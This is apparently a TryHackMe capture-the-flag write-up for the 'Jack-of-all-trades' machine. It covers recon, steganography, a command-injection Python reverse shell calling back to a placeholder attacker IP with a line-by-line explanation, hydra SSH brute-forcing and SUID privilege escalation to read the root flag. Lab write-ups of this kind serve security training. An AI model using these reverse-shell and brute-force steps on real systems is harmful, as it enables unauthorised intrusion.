# TRYHACKME
STEP 1:-  
scan target using nmap -sV -T4 -vv [ip]
here show the port 22 ssh and 80 http are open, so we open the browser and open website on port 22

here we show the website and also show the source code:-

```
<html>
	<head>
		<title>Jack-of-all-trades!</title>
		<link href="assets/style.css" rel=stylesheet type=text/css>
	</head>
	<body>
		<img id="header" src="assets/header.jpg" width=100%>
		<h1>Welcome to Jack-of-all-trades!</h1>
		<main>
			<p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
			<p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
			<p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
			<p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
			<img src="assets/stego.jpg">
			<p>I make a lot of models myself, but I also do toys, like this one:</p>
			<img src="assets/jackinthebox.jpg">
			<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
			<!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
			<p>I hope you choose to employ me. I love making new friends!</p>
			<p>Hope to see you soon!</p>
			<p id="signature">Jack</p>
		</main>
	</body>
</html>
```
here we show the three images and username jack and also base 64 encodded string, directory /recovery.php.

STEP 2:-  
go to the site and traverse recovery.php directory, here we show the login page is open.  
we uses cybershef for decoding string for finding password, we find password.  
username=jack
&&password=u?WtKSraq  
we just uses this but this credential don't work.  
so we uses previous images and extract them using steghide.  

CMD:-steghide extract -sf [image name]  
I cannot extract hidden data inside jackinthebox.jpg with that password so just skip it. Let’s see what’s inside the “creds.txt”.
try on rest to images, this is need the password that we find above and this work.  
i have extracted files.  
here stego.jpg not have any info, so we open second image file that have list of passwords.  

```
# cat cms.creds
Here you go Jack. Good thing you thought ahead!
Username: jackinthebox
Password:TplFxiSHjY
```
now we have username and password, than i goto the login page and enter cred. that's work.  

STEP 3:-  
here i show the this page will enter cmd on url, so i think i need to uses some reverse shell cmd.
```
python -c "import socket,subprocess,os,pty; s=socket.socket(); s.connect(('YOUR_IP',4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn('/bin/bash')"

🔧 Explanation (Step-by-step)
1. Imports
import socket, subprocess, os, pty

socket – Used to create a network connection.
subprocess – Can be used to run system commands.
os – To duplicate file descriptors.
pty – Gives us a pseudo-terminal for better shell interaction.

2. Create a socket
s = socket.socket()

This creates a TCP socket using default parameters (AF_INET, SOCK_STREAM).

3. Connect to Attacker (Your Listener)
s.connect(('YOUR_IP', 4444))

Replaces 'YOUR_IP' with your Kali machine IP (or the attacker's IP).
4444 is the port on which your netcat is listening.

4. Redirect Standard File Descriptors
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

This redirects standard input/output/error to the socket.
That way, commands typed on the attacker machine are sent to the victim.

5. Spawn a TTY Shell
pty.spawn('/bin/bash')

Spawns an interactive bash shell.
Helps avoid issues like broken ls, clear, tab-completion, etc.
```
than go to my terminal and open the web shell.  

```
Start a listener:
nc -lvnp 4444
www-data@jack-of-all-trades:/var/www/html/nnxhwe0V$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@jack-of-all-trades:/home$ cat jacks_password_list
cat jacks password list
*hclqAzj+2GC+=0K
 eN<A@n^zI?FE$15,
 X<(@zo2XrEN)#MGC
 ,,aE1K,nW30s,afb
 ITMJpGGIqg1jn?>@
 0HguX{,fgXPE;8yF
 sjRUb4*@pz<*ZITu
 [8V7o^gl(Gjt5[WB
 yTq0jI$d}Ka<T}PD
 Sc.[[2pL<>e)vC4}
 9;}#q*,A4wd{<X.T
 M41nrFt#PcV=(3%p
 GZx.t)H$&awU;SO<
 .MVettz]a;&Z;CAC
 2fh%i9Pr5YiYIf51
 TDF@mdEd3ZQ(]hBO
 v]XBmwAk8vk5t3EF
 9iYZeZGQGG9&W4d1
 8TIFce;KjrBWTAY^
 SeUAwt7EB#fY&+yt
 n.FZvJ.x9sYe5s5d
 8lN{)g32PG,1?[pM
 z@e1PmlmQ%k5sDz@
 ow5APF>6r,y4krSo
```

STEP 4:-  
copy the above password list and make passwd.txt file.  
here we already have username=jack using above password file we crack the password using hydra.  
CMD:-hydra -l jack -P password.txt -u ssh://[ip]  
this will give password and that credential will gain ssh server shell access.  

```
jack@jack-of-all-trades:~$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack), 24(cdrom), 25 (floppy), 29(audi o), 30(dip), 44(video), 46(plugdev), 108 (netdev), 115 (bluetooth), 1001(dev)
jack@jack-of-all-trades:~$
```
here we show the we gain user jack privilages.  

STEP 5:-  
HERE we need to gain as root privilages.  
```
jack@jack-of-all-trades:~$ sudo -l
[sudo] password for jack:
Sorry, user jack may not run sudo on jack-of-all-trades.
jack@jack-of-all-trades:~$
```
here that's not work, so we need to find all files that exucute by root.
```
jack@jack-of-all-trades:~$ find / -permus 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su
jack@jack-of-all-trades:~$ |
```
Found strings with SUID bit set. Oh no, not the classic mistake! This meant I could read any file on the system with root privileges, including the root flag file.
```
jack@jack-of-all-trades:~$ strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```

SUMMARY:-  
"This challenge was an absolute blast! It combined everything—from unconventional ports and OSINT to steganography and privilege escalation. I really appreciated how it strung together multiple techniques in a logical progression, testing not just individual skills but also the ability to connect the dots and think holistically."
